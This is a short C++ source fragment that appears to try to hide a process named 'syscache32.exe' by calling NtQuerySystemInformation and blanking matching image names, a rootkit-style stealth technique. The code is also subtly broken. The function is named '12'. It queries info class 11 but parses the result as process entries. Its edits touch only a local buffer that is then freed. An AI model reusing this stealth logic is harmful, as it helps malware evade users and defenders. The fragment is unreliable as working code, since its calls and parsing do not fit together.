#include "01.h"
#include "12.h"
void 12() {
    DWORD f = 0;
    HANDLE t = NULL;
    typedef NTSTATUS (NTAPI* pNtQuerySystemInformation)(DWORD, PVOID, ULONG, PULONG);
    pNtQuerySystemInformation ZwQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (ZwQuerySystemInformation) {
        ZwQuerySystemInformation(11, &f, 0, &f);
        f += 1024;
        BYTE* b = new BYTE[f];
        if (ZwQuerySystemInformation(11, b, f, NULL) == 0) {
            DWORD* d = (DWORD*)b;
            DWORD c = d[0];
            BYTE* ptr = (BYTE*)(d + 1);
            for (DWORD i = 0; i < c; i++) {
                SYSTEM_PROCESS_INFORMATION* s = (SYSTEM_PROCESS_INFORMATION*)ptr;
                if (s->ImageName.Buffer) {
                    if (wcscmp(s->ImageName.Buffer, L"syscache32.exe") == 0) {
                        s->ImageName.Length = 0;
                        s->ImageName.Buffer = NULL;
                    }
                }
                if (!s->NextEntryOffset) break;
                ptr += s->NextEntryOffset;
            }
        }
        delete[] b;
    }
}
